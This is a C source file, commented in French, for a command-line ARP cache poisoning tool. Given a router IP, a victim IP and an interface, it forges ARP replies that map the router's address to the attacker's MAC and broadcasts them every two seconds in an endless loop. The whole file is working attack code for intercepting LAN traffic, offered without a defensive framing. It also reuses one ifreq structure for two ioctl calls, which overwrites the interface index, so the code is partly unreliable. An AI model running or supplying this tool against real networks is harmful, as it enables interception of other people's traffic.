#include <sys/socket.h>    // Pour socket()
#include <arpa/inet.h>     // Pour inet_addr() (convertir IP texte en binaire)
#include <net/ethernet.h>  // Pour struct ether_header
#include <netinet/if_ether.h> // Pour struct ether_arp
#include <net/if.h>        // Pour obtenir l'index de l'interface (nécessaire pour envoyer)
#include <sys/ioctl.h>     // Pour communiquer avec le pilote réseau
#include <linux/if_packet.h> // Pour struct sockaddr_ll (l'adresse de destination bas niveau)
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int ac, char **av)
{
    if (ac != 4 )
    {
        printf("Pas le bon format ! \n sudo ./arp_poison <IP_ROUTEUR> <IP_VICTIME> <INTERFACE>\n");        
        exit(EXIT_FAILURE);
    }
    
    unsigned char MAC_ATTACKER[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    unsigned char MAC_VICTIM[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    if (sock == -1)
    {
        perror("ERROR");
        exit(EXIT_FAILURE);
    }

    char buffer[100];
    memset(buffer, 0, sizeof(buffer));

    printf("Socket ARP créé avec succés.\n");

    struct ether_header *eth = (struct ether_header *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
    struct ifreq iface_req; 

    uint32_t ip_rout = inet_addr(av[1]);
    uint32_t ip_victim = inet_addr(av[2]);    

    strncpy(iface_req.ifr_name, av[3], IF_NAMESIZE -1);

    int tunnel_hardware = ioctl(sock, SIOCGIFINDEX, &iface_req); 
    int mac_int = ioctl(sock, SIOCGIFHWADDR, &iface_req);


    if (mac_int == -1)
    {
        perror("ERROR");
        exit(EXIT_FAILURE);
    }

    if (tunnel_hardware == -1)
    {
        perror("ERROR");
        exit(EXIT_FAILURE);
    }

    eth->ether_type = htons(ETHERTYPE_ARP);

    unsigned char *mac = (unsigned char *)iface_req.ifr_hwaddr.sa_data;
    memcpy(MAC_ATTACKER, mac, ETH_ALEN);

    memcpy(eth->ether_shost, MAC_ATTACKER, ETH_ALEN);
    memcpy(eth->ether_dhost, MAC_VICTIM, ETH_ALEN);

    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETH_ALEN;
    arp->arp_pln = 4;
    arp->arp_op = htons(ARPOP_REPLY);
    
    memcpy(arp->arp_sha, MAC_ATTACKER, ETH_ALEN);
    memcpy(arp->arp_spa, &ip_rout, sizeof(uint32_t));

    memcpy(arp->arp_tha, MAC_VICTIM, ETH_ALEN);
    memcpy(arp->arp_tpa, &ip_victim, sizeof(uint32_t));

    int ifindex = iface_req.ifr_ifindex;
    struct sockaddr_ll socket_address;

    memset(&socket_address, 0, sizeof(socket_address));

    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    
    memcpy(socket_address.sll_addr, MAC_VICTIM, ETH_ALEN);

    int packet_size = sizeof(struct ether_header) + sizeof(struct ether_arp);
    socklen_t addr_len = sizeof(struct sockaddr_ll);

    while (1)
    {
        int bytes_send = sendto(sock, buffer, packet_size, 0, 
                                (struct sockaddr *)&socket_address, 
                                addr_len);
        
        if (bytes_send == -1)
        {
            perror("FATAL ERROR: sendto failed");
        }
        else
        {
            printf("ARP Poisoning packet sent! Size: %d bytes. Refreshing cache...\n", bytes_send);
        }
        sleep(2);
        
    }
    

}